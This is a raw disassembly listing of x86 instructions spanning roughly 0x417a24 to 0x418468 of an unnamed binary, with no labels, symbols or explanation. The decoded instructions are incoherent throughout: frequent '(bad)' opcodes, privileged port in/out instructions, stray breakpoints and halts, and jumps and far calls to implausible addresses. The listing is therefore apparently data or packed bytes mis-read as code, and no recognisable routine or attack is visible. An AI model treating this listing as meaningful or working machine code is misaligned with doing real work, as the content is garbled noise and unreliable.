  417a24:	bound  ecx,QWORD PTR [eax]
  417a26:	push   ebp
  417a27:	sbb    WORD PTR [eax+0x6c],ax
  417a2b:	and    ch,BYTE PTR [edi]
  417a2d:	imul   BYTE PTR [edx+0x11]
  417a30:	inc    esp
  417a31:	add    al,0xe9
  417a33:	pop    ds
  417a34:	test   al,0x73
  417a36:	int3   
  417a37:	push   es
  417a38:	ficom  WORD PTR [eax]
  417a3a:	in     eax,dx
  417a3b:	pop    ds
  417a3c:	pop    ebx
  417a3d:	xchg   DWORD PTR [edi-0x79],esp
  417a40:	pop    esp
  417a41:	add    cl,ch
  417a43:	pop    edi
  417a44:	mov    eax,ds:0xa863ed86
  417a49:	std    
  417a4a:	add    BYTE PTR [ebp+0x5c],cl
  417a4d:	add    BYTE PTR [eax],al
  417a4f:	int3   
  417a50:	and    eax,0x40d
	...
  417a79:	add    BYTE PTR [eax],al
  417a7b:	add    BYTE PTR ds:0x6d86895c,dh
  417a81:	test   al,0xfd
  417a83:	push   ebp
  417a85:	mov    ebx,0xa835868a
  417a8a:	std    
  417a8b:	(bad)  
  417a8c:	mov    edi,0x3d885ea1
  417a91:	popa   
  417a92:	adc    DWORD PTR [eax],0x9
  417a95:	pop    esp
  417a96:	add    BYTE PTR [esi-0x50],bl
  417a99:	sbb    DWORD PTR ds:0x71617800,eax
  417a9f:	mov    eax,0x1fe6776
  417aa4:	jae    0x417a66
  417aa6:	add    DWORD PTR [eax],eax
  417aa8:	add    eax,0x88096823
  417aad:	mov    dh,0x8a
  417aaf:	xchg   ch,ah
  417ab1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417ab2:	std    
  417ab3:	dec    DWORD PTR [esi+eiz*1+0x15]
  417ab7:	add    al,0xc5
  417ab9:	pop    ebx
  417aba:	inc    eax
  417abb:	mov    DWORD PTR [ebx-0x40],esp
  417abe:	add    DWORD PTR [eax],eax
  417ac0:	mov    ch,0x26
  417ac2:	adc    DWORD PTR [eax],0xffffffc9
  417ac5:	pop    ebx
  417ac6:	add    BYTE PTR [ebx+0x1b73b],cl
  417acc:	mov    ch,0x21
  417ace:	or     eax,0xbf606702
  417ad3:	mov    BYTE PTR [ebp+0x5c],dh
  417ad6:	mov    ds,WORD PTR [ecx+edi*2]
  417ad9:	pop    ebx
  417ada:	add    BYTE PTR [ebp+0x6c],dh
  417add:	and    al,BYTE PTR [ebx+0x10]
	...
  417b07:	add    BYTE PTR [eax],al
  417b09:	jns    0x417b66
  417b0b:	add    BYTE PTR [ecx+0x1b70b],cl
  417b11:	test   DWORD PTR [ebx-0x51e35178],ebx
  417b17:	std    
  417b18:	jmp    DWORD PTR [ebx+0x3a]
  417b1b:	jle    0x417b2c
  417b1d:	and    BYTE PTR [edx-0x466574ff],dh
  417b23:	std    
  417b24:	dec    DWORD PTR [ebx+0x3b]
  417b27:	hlt    
  417b28:	add    DWORD PTR [esi+0x37],ebp
  417b2b:	inc    edx
  417b2c:	xchg   DWORD PTR [ebx+esi*4],ecx
  417b2f:	jae    0x417b4c
  417b31:	sbb    BYTE PTR [edx+0x3d057501],dh
  417b37:	jle    0x417b48
  417b39:	sbb    BYTE PTR [edx-0x435d76ff],dh
  417b3f:	std    
  417b40:	call   DWORD PTR [ebx]
  417b42:	cmc    
  417b43:	jp     0x417af2
  417b45:	sub    BYTE PTR [eax+0x3e950001],bh
  417b4b:	hlt    
  417b4c:	add    ebx,DWORD PTR [esp+esi*4]
  417b4f:	js     0x417ad6
  417b51:	adc    al,0xc0
  417b53:	add    DWORD PTR [eax],eax
  417b55:	xchg   esi,eax
  417b56:	mov    esp,0x73e2c8ff
  417b5b:	ja     0x417b33
  417b5d:	inc    DWORD PTR [esi+0x7c]
  417b60:	pop    es
  417b61:	outs   dx,BYTE PTR ds:[esi]
  417b62:	sub    DWORD PTR [esi],esi
  417b64:	out    0xe5,eax
  417b66:	mov    al,0x4
  417b68:	(bad)  
  417b69:	xchg   edi,eax
  417b6a:	jge    0x417beb
  417b6c:	fild   WORD PTR [eax]
	...
  417b96:	and    BYTE PTR [edi+esi*2-0x33],ah
  417b9a:	(bad)  
  417b9b:	clc    
  417b9c:	add    eax,0x3439abfe
  417ba1:	cmp    BYTE PTR [ebp+0x6a8ab2b2],0x8c
  417ba8:	inc    esp
  417ba9:	sti    
  417baa:	xchg   ebx,eax
  417bab:	in     eax,0x80
  417bad:	out    0x1d,al
  417baf:	inc    ebp
  417bb0:	ja     0x417b7f
  417bb2:	je     0x417be4
  417bb4:	add    eax,0x465b7bfe
  417bb9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417bba:	rcr    BYTE PTR [eax-0x6b60fc11],1
  417bc0:	xchg   esi,eax
  417bc1:	add    dl,BYTE PTR [edx+0x1c03e347]
  417bc7:	fcom   DWORD PTR [eax]
  417bc9:	sti    
  417bca:	enter  0x7243,0x7d
  417bce:	sbb    ebx,DWORD PTR [edi-0x19]
  417bd1:	add    edx,DWORD PTR [ebp+0x3bffcfdd]
  417bd7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417bd8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417bd9:	jp     0x417b5c
  417bdb:	inc    edi
  417bdc:	jecxz  0x417be1
  417bde:	sbb    al,0xd4
  417be0:	ins    DWORD PTR es:[edi],dx
  417be1:	repz pop ds
  417be3:	pop    ebx
  417be4:	out    0x78,eax
  417be6:	mov    eax,ds:0x1c03eb42
  417beb:	rcl    edi,1
  417bed:	add    esi,ebp
  417bef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417bf0:	sub    DWORD PTR [ebx+0x13],edi
  417bf3:	pop    esp
  417bf4:	pop    ebp
  417bf5:	out    0x1f,eax
  417bf7:	pop    ebx
  417bf8:	out    0x8e,eax
	...
  417c22:	add    BYTE PTR [edx+edx*8],dl
  417c25:	gs repz pop ds
  417c28:	pop    ebx
  417c29:	out    0x7a,eax
  417c2b:	cdq    
  417c2c:	inc    edx
  417c2d:	jecxz  0x417c32
  417c2f:	sbb    al,0x1b
  417c31:	jo     0x417c88
  417c33:	aaa    
  417c34:	pop    edi
  417c35:	out    0x3,eax
  417c37:	xchg   ebp,eax
  417c38:	(bad)  
  417c3a:	inc    ebx
  417c3c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417c3d:	bound  edi,QWORD PTR [ebp+0x13]
  417c40:	pop    edi
  417c41:	out    0x3,eax
  417c43:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417c44:	dec    edx
  417c45:	jmp    0x5fda271f
  417c4a:	adc    al,0xa3
  417c4c:	xlat   BYTE PTR ds:[ebx]
  417c4d:	jmp    0x417c56
  417c4f:	sbb    al,0x5b
  417c51:	cmp    al,0x1d
  417c53:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417c54:	(bad)  
  417c56:	pop    es
  417c57:	sbb    al,0x5b
  417c59:	add    BYTE PTR [eax-0x6a],ah
  417c5c:	inc    edx
  417c5d:	add    al,0xe9
  417c5f:	pop    ds
  417c60:	sbb    eax,DWORD PTR [edi+0x5f3c57]
  417c66:	jmp    0xed525903
  417c6b:	pop    ds
  417c6c:	pop    ebx
  417c6d:	mov    DWORD PTR [edi+0x38],esp
  417c70:	pop    edi
  417c71:	add    cl,ch
  417c73:	mov    eax,ds:0x1e9b024a
  417c78:	call   0xe51c:0xd518d988
  417c7f:	pop    ds
  417c80:	pop    ebx
  417c81:	jae    0x417c83
  417c83:	mov    ds:0xe510dc,eax
	...
  417cb0:	pop    ds
  417cb1:	pop    ebx
  417cb2:	xchg   DWORD PTR [edi+0x0],ebp
  417cb5:	pop    edi
  417cb6:	add    cl,ch
  417cb8:	pop    edi
  417cb9:	fsubr  QWORD PTR [esi+0x5b1be5]
  417cbf:	jo     0x417c57
  417cc1:	dec    ebx
  417cc2:	add    al,0xe9
  417cc4:	pop    ds
  417cc5:	rol    BYTE PTR [esi+0x5b23d1],cl
  417ccb:	cmp    DWORD PTR [eax],edi
  417ccd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417cce:	mov    edi,ebp
  417cd0:	and    ebx,DWORD PTR [ebx+0x0]
  417cd3:	pushf  
  417cd4:	add    dl,dl
  417cd6:	xchg   cl,bh
  417cd8:	and    ebx,DWORD PTR [ebx+0x0]
  417cdb:	jo     0x417c83
  417cdd:	inc    ebx
  417cde:	add    al,0xe9
  417ce0:	pop    ds
  417ce1:	sbb    eax,DWORD PTR [edi+0x5efc47]
  417ce7:	jmp    0xed525a94
  417cec:	pop    ds
  417ced:	pop    ebx
  417cee:	mov    DWORD PTR [edi+0x7],esp
  417cf1:	pop    edi
  417cf2:	add    cl,ch
  417cf4:	iret   
  417cf5:	jnp    0x417cf6
  417cf7:	pop    esi
  417cf8:	cmp    ebx,DWORD PTR [edi+0x0]
  417cfb:	add    BYTE PTR [ebp+0x38b1523],al
  417d01:	dec    eax
  417d02:	add    al,0x0
  417d04:	jne    0x417cdd
  417d06:	xchg   BYTE PTR [eax],bl
  417d08:	sbb    DWORD PTR [eax+0x0],0x1ce9ec40
  417d0f:	add    al,0x75
  417d11:	pop    eax
  417d12:	test   DWORD PTR [esi+0x0],eax
	...
  417d3c:	add    BYTE PTR [ebp+0x5c],ah
  417d3f:	add    BYTE PTR [eax],al
  417d41:	mov    esi,0x450418d1
  417d46:	pop    eax
  417d47:	shl    BYTE PTR [eax],1
  417d49:	xor    al,0xca
  417d4b:	sbb    al,0x4
  417d4d:	xor    eax,0xbe197158
  417d52:	rcl    DWORD PTR [eax],1
  417d54:	add    al,0x45
  417d56:	pop    eax
  417d57:	test   DWORD PTR [esi+0x531d],eax
  417d5d:	jne    0x417d36
  417d5f:	scas   al,BYTE PTR es:[edi]
  417d60:	sbb    al,0x1
  417d62:	pop    eax
  417d63:	add    BYTE PTR [ecx+0x44883],cl
  417d69:	cmc    
  417d6a:	aam    0xb6
  417d6c:	sbb    cl,dh
  417d6e:	push   edi
  417d6f:	add    al,dl
  417d71:	and    edi,DWORD PTR [ecx]
  417d73:	pop    ecx
  417d74:	ret    0x57ed
  417d77:	xchg   DWORD PTR [ecx+eiz*8+0x5b],eax
  417d7b:	push   esi
  417d7c:	push   edi
  417d7d:	jle    0x417da3
  417d7f:	and    al,0x10
  417d81:	ds scas eax,DWORD PTR es:[edi]
  417d83:	cmp    DWORD PTR [eax+0x730057c5],eax
  417d89:	jmp    0x4646796a
  417d8e:	inc    ecx
  417d8f:	aaa    
  417d90:	xchg   cl,ah
  417d92:	pop    ebx
  417d93:	add    BYTE PTR [eax],al
  417d95:	push   ecx
  417d96:	add    esi,ebx
  417d98:	fcomp  DWORD PTR [esi]
  417d9a:	lahf   
  417d9b:	jg     0x417d7d
  417d9d:	sbb    al,0xb4
  417d9f:	pusha  
  417da0:	add    DWORD PTR [eax],0x0
	...
  417dca:	pop    esp
  417dcb:	mov    esi,0xb224c25f
  417dd0:	cmp    al,0x86
  417dd2:	inc    eax
  417dd3:	mov    esi,0xaf080001
  417dd8:	sbb    BYTE PTR ds:[edx+esi*4],0x1
  417ddd:	jno    0x417df8
  417ddf:	xor    edi,ebp
  417de1:	add    dh,BYTE PTR [edi-0x5f]
  417de4:	add    BYTE PTR ds:[ecx],bl
  417de7:	mov    dl,0x1
  417de9:	jb     0x417e08
  417deb:	inc    ebp
  417dec:	cmp    eax,0x1b1d100
  417df1:	jb     0x417e10
  417df3:	jne    0x417db6
  417df5:	call   0xc0c4bf0e
  417dfa:	pop    ds
  417dfb:	inc    edx
  417dfc:	in     al,dx
  417dfd:	es ss cmp al,0xff
  417e01:	push   ebp
  417e02:	xchg   edi,eax
  417e03:	jae    0x417d90
  417e05:	fdiv   DWORD PTR [ebp*4+0x1bfdfb]
  417e0c:	dec    eax
  417e0d:	sbb    BYTE PTR [esi],ah
  417e0f:	std    
  417e10:	pusha  
  417e11:	pop    esi
  417e12:	fisubr WORD PTR [ecx+eax*1-0x4470bab]
  417e19:	std    
  417e1a:	sti    
  417e1b:	rol    DWORD PTR [eax+eax*8+0x8c39a18],1
  417e22:	sbb    al,0xe5
  417e24:	mov    WORD PTR [eax+edi*1-0x44],ds
  417e28:	push   esi
  417e29:	push   esi
  417e2a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417e2b:	inc    ebx
  417e2c:	cmp    DWORD PTR [esi+0x0],0x0
	...
  417e57:	add    al,0xb0
  417e59:	add    DWORD PTR [eax],eax
  417e5b:	sbb    al,0xc9
  417e5d:	adc    BYTE PTR [edi+eiz*1-0x62fffe4d],al
  417e64:	lods   eax,DWORD PTR ds:[esi]
  417e65:	add    DWORD PTR [eax],0x74e75b1c
  417e6b:	jmp    0x417e4a
  417e6d:	pop    ebx
  417e6e:	sub    BYTE PTR [edi+edx*2],al
  417e71:	pop    edx
  417e72:	test   BYTE PTR ds:[edx-0x2e],ch
  417e76:	add    BYTE PTR [edx+0x4cebb5d6],dl
  417e7c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417e7d:	mov    esi,0xbf919600
  417e82:	std    
  417e83:	jbe    0x417e27
  417e85:	scas   al,BYTE PTR es:[edi]
  417e86:	(bad)  
  417e87:	fdiv   DWORD PTR [esi-0x1]
  417e8a:	mov    WORD PTR [edx+0x1c03e34b],ss
  417e90:	aad    0xa2
  417e92:	daa    
  417e93:	pop    ebx
  417e94:	pop    esp
  417e95:	mov    al,ds:0x6f029305
  417e9a:	add    eax,0x7d7d949
  417e9f:	sbb    al,0x5b
  417ea1:	pusha  
  417ea2:	mov    eax,ds:0x3e75700
  417ea7:	sar    bh,cl
  417ea9:	rol    ebp,0x14
  417eac:	pop    ebx
  417ead:	push   0xffffffd0
  417eaf:	and    DWORD PTR [ebp+edx*4+0x1f],ebx
  417eb3:	and    BYTE PTR [ebx-0x19],bl
  417eb6:	mov    es,WORD PTR [ecx+0x1abc54]
	...
  417ee4:	xchg   ebp,eax
  417ee5:	fcom   st(7)
  417ee7:	pop    es
  417ee8:	sbb    al,0x5b
  417eea:	pusha  
  417eeb:	mov    DWORD PTR [edi+edx*2],edx
  417eee:	out    0x3,eax
  417ef0:	pop    esp
  417ef1:	aam    0x55
  417ef3:	pop    ds
  417ef4:	and    BYTE PTR [ebx-0x19],bl
  417ef7:	mov    bl,BYTE PTR [edx+0x1c03eb4a]
  417efd:	(bad)  
  417efe:	sbb    ebx,DWORD PTR gs:[eax]
  417f01:	pop    ebx
  417f02:	out    0x8d,eax
  417f04:	adc    al,0x5d
  417f06:	xor    BYTE PTR [ecx],al
  417f08:	(bad)  
  417f0a:	add    cl,ah
  417f0c:	push   ds
  417f0d:	loope  0x417f2b
  417f0f:	in     eax,0x1f
  417f11:	pop    ebx
  417f12:	jae    0x417f14
  417f14:	xchg   edi,eax
  417f15:	fcom   DWORD PTR [eax]
  417f17:	in     eax,0x1f
  417f19:	pop    ebx
  417f1a:	xchg   DWORD PTR [edi+0x38],ebp
  417f1d:	push   edi
  417f1e:	add    cl,ch
  417f20:	(bad)  
  417f22:	scas   al,BYTE PTR es:[edi]
  417f23:	in     eax,0x23
  417f25:	pop    ebx
  417f26:	add    BYTE PTR [eax-0x66],dh
  417f29:	dec    edx
  417f2a:	add    al,0xe9
  417f2c:	pop    ds
  417f2d:	aam    0x86
  417f2f:	rcr    DWORD PTR [ebx],1
  417f31:	pop    ebx
  417f32:	add    BYTE PTR [ecx-0x572e2bc0],bh
  417f38:	jbe    0x417f8c
  417f3a:	sub    DWORD PTR [ebx-0x6076f2e2],0x86fa9940
  417f44:	dec    ebx
  417f45:	rol    DWORD PTR [esi+0xd9],cl
	...
  417f6f:	add    BYTE PTR [eax],al
  417f71:	sbb    ebx,DWORD PTR [ebx+0x0]
  417f74:	popa   
  417f75:	sbb    bl,ah
  417f77:	(bad)  
  417f78:	call   0x6f40da9c
  417f7d:	adc    BYTE PTR [edi+0x0],dl
  417f80:	jmp    0xed664015
  417f85:	pop    ds
  417f86:	pop    ebx
  417f87:	jg     0x417fdb
  417f89:	cwde   
  417f8a:	pop    ebx
  417f8b:	add    cl,ch
  417f8d:	mov    es,WORD PTR [ebx-0x7f]
  417f90:	int    0x3b
  417f92:	inc    ebx
  417f93:	add    ah,BYTE PTR [edx+0x4c]
  417f96:	ja     0x417fb0
  417f98:	cwde   
  417f99:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417f9a:	xchg   ecx,eax
  417f9b:	call   0xfde0661e
  417fa0:	mov    esi,0x2b590441
  417fa5:	sub    BYTE PTR [ebx+0x7f],bl
  417fa8:	adc    bl,BYTE PTR [eax]
  417faa:	pop    esp
  417fab:	add    BYTE PTR [eax],al
  417fad:	mov    ch,0x2a
  417faf:	add    al,0x29
  417fb1:	jns    0x41802b
  417fb3:	sbb    BYTE PTR [ecx+0x795cae],al
  417fb9:	lds    ebp,FWORD PTR [edx]
  417fbb:	add    al,0x29
  417fbd:	stc    
  417fbe:	jb     0x417fd8
  417fc0:	mov    esi,ecx
  417fc2:	jb     0x417fdc
  417fc4:	push   ecx
  417fc5:	dec    BYTE PTR [ebp-0x5e909318]
  417fcb:	sti    
  417fcc:	pop    edi
  417fcd:	inc    ebx
  417fce:	cmp    dl,BYTE PTR [edi-0x3e]
  417fd1:	lea    ebx,[ebx+eax*8-0x7a]
	...
  417ffd:	add    BYTE PTR ds:0x84000053,bl
  418003:	pop    esp
  418004:	add    BYTE PTR [eax],al
  418006:	hlt    
  418007:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418008:	add    BYTE PTR [eax],0x75
  41800b:	pop    esp
  41800c:	outs   dx,DWORD PTR ds:[esi]
  41800d:	dec    ecx
  41800e:	(bad)  
  41800f:	pop    ds
  418010:	and    al,0x18
  418012:	cmp    DWORD PTR ds:0x77c33b42,ebp
  418018:	add    al,0x0
  41801a:	xor    eax,0x3fe83a28
  41801f:	mov    ds:0x8dbefffb,al
  418024:	call   0xfbe23f2c
  418029:	mov    esi,ebx
  41802b:	mov    bl,0xc9
  41802d:	stc    
  41802e:	jb     0x417fd1
  418030:	mov    al,BYTE PTR [ecx+ebx*1+0x3f]
  418034:	xchg   DWORD PTR [esi+0x57e5],ecx
  41803a:	(bad)  
  41803b:	lea    esp,[ecx+eax*1]
  41803e:	pop    es
  41803f:	mov    al,BYTE PTR [edx]
  418041:	ret    0xd3a2
  418044:	std    
  418045:	(bad)  
  418046:	jnp    0x418094
  418048:	add    al,0x0
  41804a:	cmc    
  41804b:	into   
  41804c:	sahf   
  41804d:	and    al,0x1c
  41804f:	scas   al,BYTE PTR es:[edi]
  418050:	add    DWORD PTR [eax],eax
  418052:	jb     0x418043
  418054:	pop    edx
  418055:	ret    0xb214
  418058:	or     ch,0xc3
  41805b:	mov    dl,0xbb
  41805d:	sbb    al,0x20
  41805f:	mov    dl,0x1
  418061:	mov    eax,DWORD PTR [eax]
	...
  41808b:	inc    ebx
  41808c:	mov    ebx,0x2f971778
  418091:	adc    al,0x4
  418093:	sbb    al,0xb2
  418095:	mov    al,BYTE PTR [esi+0x1ae34]
  41809b:	fdivr  QWORD PTR [edx]
  41809d:	scas   al,BYTE PTR es:[edi]
  41809e:	sbb    al,0x20
  4180a0:	mov    dl,0x1
  4180a2:	xchg   DWORD PTR [edx+0x1c000581],ebx
  4180a8:	cmp    eax,0xb2181886
  4180ad:	add    DWORD PTR [edx-0x1304bf4],ecx
  4180b3:	pop    esi
  4180b4:	sub    DWORD PTR [edi+edi*8],edx
  4180b7:	cdq    
  4180b8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4180b9:	add    eax,0x19471c00
  4180be:	mov    DWORD PTR [edx+0x1c000581],esp
  4180c4:	sub    eax,DWORD PTR [esi+0x1b22018]
  4180ca:	inc    eax
  4180cb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4180cc:	pop    edi
  4180cd:	and    BYTE PTR [esp+ebx*1],al
  4180d0:	mov    dl,0x8a
  4180d2:	xchg   BYTE PTR [esi+esi*4],cl
  4180d5:	add    DWORD PTR [eax],eax
  4180d7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4180d8:	cs sbb al,0x4
  4180db:	sbb    al,0xb4
  4180dd:	shl    DWORD PTR [eax],1
  4180df:	inc    edi
  4180e0:	sub    BYTE PTR ss:[esp+ebx*1],al
  4180e4:	mov    ah,0x75
  4180e6:	jb     0x41808f
  4180e8:	jno    0x4180ab
  4180ea:	call   0x205b213
	...
  418117:	add    BYTE PTR [ebx+ebx*2+0xf],cl
  41811b:	xchg   esi,eax
  41811c:	jmp    0x4180bc
  41811e:	push   ds
  41811f:	mov    DWORD PTR [edx+0x1c03eb4b],ebp
  418125:	shl    eax,cl
  418127:	mov    ebx,0x3e79ecb
  41812c:	ret    
  41812d:	fcom   st(7)
  41812f:	pop    es
  418130:	sbb    al,0x5b
  418132:	pusha  
  418133:	sahf   
  418134:	clc    
  418135:	push   esi
  418136:	out    0x3,eax
  418138:	sub    esp,DWORD PTR [edx+0x5b1c0367]
  41813e:	pop    edx
  41813f:	sbb    al,0x9d
  418141:	das    
  418142:	or     ebx,DWORD PTR [esi+ebx*1]
  418145:	shl    BYTE PTR [ebx],cl
  418147:	sub    BYTE PTR [ecx+ecx*1],ah
  41814a:	jb     0x418119
  41814c:	je     0x418185
  41814e:	sar    ah,0x79
  418151:	(bad)  
  418152:	adc    al,0x5f
  418154:	aad    0x98
  418156:	fild   WORD PTR [ebx]
  418158:	jmp    0x4180fb
  41815a:	out    0x6,eax
  41815c:	sbb    al,0x5b
  41815e:	sbb    DWORD PTR [eax],ecx
  418160:	add    edx,DWORD PTR [edi]
  418162:	retf   
  418163:	sbb    edx,ebx
  418165:	mov    eax,ds:0x5b1c7ee7
  41816a:	stc    
  41816b:	push   0xfffffffb
  41816d:	push   ss
  41816e:	ret    
  41816f:	sbb    esp,DWORD PTR [ebp-0x31e434f9]
  418175:	rcr    DWORD PTR [ebp+0x66a3f3eb],1
  41817b:	cld    
	...
  4181a4:	add    cl,al
  4181a6:	cld    
  4181a7:	mov    ebx,0xe752de58
  4181ac:	add    dl,dl
  4181ae:	ds jecxz 0x4181b4
  4181b1:	sbb    al,0x28
  4181b3:	loopne 0x41813d
  4181b5:	call   0xd4:0x1c03e34a
  4181bc:	outs   dx,DWORD PTR ds:[esi]
  4181bd:	pop    ss
  4181be:	push   edi
  4181bf:	add    cl,ch
  4181c1:	pop    edi
  4181c2:	(bad)  
  4181c3:	scas   al,BYTE PTR es:[edi]
  4181c4:	add    eax,0x70005b14
  4181c9:	mov    eax,ds:0x1fe9044a
  4181ce:	aam    0x86
  4181d0:	icebp  
  4181d1:	and    ebx,DWORD PTR [ebx+0x0]
  4181d4:	sbb    edi,edi
  4181d6:	popf   
  4181d7:	mov    ebx,0x5b23dd
  4181dc:	jl     0x4181f4
  4181de:	aam    0x86
  4181e0:	fldenv [ebx]
  4181e2:	pop    ebx
  4181e3:	add    BYTE PTR [eax-0x62],dh
  4181e6:	inc    edx
  4181e7:	add    al,0xe9
  4181e9:	pop    ds
  4181ea:	sbb    eax,DWORD PTR [edi+0x573487]
  4181f0:	jmp    0xed52568d
  4181f5:	pop    ds
  4181f6:	pop    ebx
  4181f7:	mov    DWORD PTR [edi+0x18],esp
  4181fa:	push   edi
  4181fb:	add    cl,ch
  4181fd:	dec    edi
  4181fe:	jp     0x418189
  418200:	adc    eax,0x7252433c
  418205:	push   esi
  418206:	mov    dl,0xd4
  418208:	mov    eax,ds:0x0
	...
  418231:	add    BYTE PTR [edi-0x61],dl
  418234:	pop    ebp
  418235:	aaa    
  418236:	cmc    
  418237:	add    eax,edx
  418239:	loope  0x41825a
  41823b:	aam    0x44
  41823d:	int    0x43
  41823f:	rcl    BYTE PTR [eax-0x2623817],1
  418245:	mov    dl,0x88
  418247:	push   esi
  418248:	add    al,0xe9
  41824a:	pop    ds
  41824b:	and    eax,0x4e917217
  418250:	add    al,0xe9
  418252:	pop    ds
  418253:	bound  edi,QWORD PTR [edi-0x408de321]
  418259:	sub    ebx,DWORD PTR [ebx+ebx*2]
  41825c:	sub    DWORD PTR [eax],eax
  41825e:	xor    al,0x5a
  418260:	add    BYTE PTR [eax+0x4],ch
  418263:	pop    ecx
  418264:	ret    0x504
  418267:	data16 rol dl,0x1
  41826b:	pop    ecx
  41826c:	jg     0x41825a
  41826e:	in     eax,0x5
  418270:	push   ecx
  418271:	mov    ebp,DWORD PTR [ecx-0x9a9dfc4]
  418277:	jge    0x418200
  418279:	icebp  
  41827a:	xchg   edx,eax
  41827b:	iret   
  41827c:	pop    esp
  41827d:	and    al,0xe5
  41827f:	iret   
  418280:	pop    esp
  418281:	and    al,0xbd
  418283:	pop    edi
  418284:	scas   al,BYTE PTR es:[edi]
  418285:	or     cl,al
  418287:	pop    eax
  418288:	add    BYTE PTR [edi],cl
  41828a:	ss hlt 
  41828c:	add    BYTE PTR [eax],al
  41828e:	mov    ch,0xad
  418290:	pop    es
  418291:	lea    esp,[ecx+0x3c]
	...
  4182bf:	test   DWORD PTR [eax-0x77],ebx
  4182c2:	and    DWORD PTR fs:[edi-0x79],edx
  4182c6:	xchg   BYTE PTR [ecx-0x64],dh
  4182c9:	std    
  4182ca:	dec    DWORD PTR [eax]
  4182cc:	rol    BYTE PTR [eax],1
  4182ce:	push   0xc8375884
  4182d3:	xor    ecx,DWORD PTR [eax-0x79]
  4182d6:	mov    gs,WORD PTR [ecx-0x64]
  4182d9:	std    
  4182da:	(bad)  
  4182db:	ds xchg edi,eax
  4182dd:	jbe    0x4182e3
  4182df:	pop    esi
  4182e0:	xchg   edi,eax
  4182e1:	out    0xb,eax
  4182e3:	pop    esi
  4182e4:	xchg   edi,eax
  4182e5:	add    DWORD PTR [eax],eax
  4182e7:	sub    eax,0x47eb0056
  4182ec:	ror    BYTE PTR gs:[ebx+0x44fbb],0x35
  4182f4:	push   ecx
  4182f5:	mov    dh,0x11
  4182f7:	sub    ch,dl
  4182f9:	inc    ebp
  4182fa:	add    DWORD PTR [esi+0x1c04960c],ecx
  418300:	cmp    DWORD PTR ds:0x8b4b978a,eax
  418306:	or     al,0x9b
  418308:	sub    BYTE PTR [edi+0x8],bh
  41830b:	and    BYTE PTR [edx-0x7e55f2ff],dh
  418311:	or     dh,BYTE PTR [esi+0x4c8eb35c]
  418317:	mov    ch,BYTE PTR [ebp-0x49df6972]
  41831d:	add    DWORD PTR [eax],eax
  41831f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418320:	popf   
  418321:	test   BYTE PTR [edi+0x0],dh
	...
  41834b:	add    BYTE PTR ds:0x1d0001b2,bl
  418351:	and    al,0xfd
  418353:	add    ebx,DWORD PTR [edx+esi*4]
  418356:	add    al,0x8e
  418358:	and    al,0xae
  41835a:	add    DWORD PTR [eax],eax
  41835c:	xchg   edi,eax
  41835d:	xor    edi,ebp
  41835f:	add    ebx,DWORD PTR [edx+esi*4]
  418362:	mov    eax,cs
  418364:	inc    edi
  418365:	sub    al,0x8
  418367:	add    al,0x1c
  418369:	mov    dl,0x82
  41836b:	neg    DWORD PTR [edx+ebx*1]
  41836e:	add    DWORD PTR [eax],eax
  418370:	or     ch,BYTE PTR [ebp-0x525d78b7]
  418376:	std    
  418377:	push   DWORD PTR [ebx-0x56]
  41837a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41837b:	or     BYTE PTR [eax],ah
  41837d:	mov    dl,0x1
  41837f:	or     eax,0xfdf7479e
  418384:	pop    ebx
  418385:	sub    BYTE PTR [eax+0x24],al
  418388:	or     al,0x8
  41838a:	add    al,0x65
  41838c:	sbb    eax,0xcac23cb2
  418391:	stos   DWORD PTR es:[edi],eax
  418392:	mov    dl,BYTE PTR [eax+eax*1-0x1e]
  418396:	in     al,dx
  418397:	pop    es
  418398:	lahf   
  418399:	sub    DWORD PTR [ecx],eax
  41839b:	or     eax,0x1f7a2
  4183a0:	sbb    al,0x5b
  4183a2:	div    BYTE PTR [ecx-0x4e11a4a1]
  4183a8:	addr16 pop esp
  4183aa:	bound  eax,QWORD PTR [eax-0x5e]
  4183ad:	pop    edi
  4183ae:	bound  edi,QWORD PTR [eax]
	...
  4183d8:	add    BYTE PTR [esi+edx*2-0x315ff6be],dl
  4183df:	call   0x66279fe7
  4183e4:	and    al,0x20
  4183e6:	pop    ebx
  4183e7:	out    0x86,eax
  4183e9:	sbb    BYTE PTR [edx+0x2e],ch
  4183ec:	inc    eax
  4183ed:	add    BYTE PTR [edi-0x19],dh
  4183f0:	or     ebx,DWORD PTR [ebx+ebx*2]
  4183f3:	sar    BYTE PTR [esi-0x69daab2],cl
  4183f9:	add    eax,0xa72f7b96
  4183fe:	loop   0x4183e7
  418400:	imul   esi,DWORD PTR [ebx+0x2081b29a],0x5f
  418407:	out    0x3,eax
  418409:	sub    dh,BYTE PTR [ebx+0x72]
  41840c:	sub    DWORD PTR [eax],0x5503e75f
  418412:	xchg   ebx,eax
  418413:	pop    ebp
  418414:	add    BYTE PTR ds:0x3507c293,dh
  41841a:	xchg   ebx,eax
  41841b:	push   0xe8031cc0
  418420:	add    eax,DWORD PTR [ebp-0x6a0705a3]
  418426:	popa   
  418427:	bound  esi,QWORD PTR [edi]
  418429:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41842a:	call   0xa0568d1a
  41842f:	sbb    cl,ah
  418431:	or     ebp,DWORD PTR [edi]
  418433:	retf   
  418434:	daa    
  418435:	rcr    BYTE PTR [esi+0x60],cl
  418438:	dec    edi
  418439:	clc    
  41843a:	inc    esi
  41843b:	ret    0xfc
	...
  418466:	sub    edi,ebx
  418468:	sbb    DWORD PTR [ebx],eax
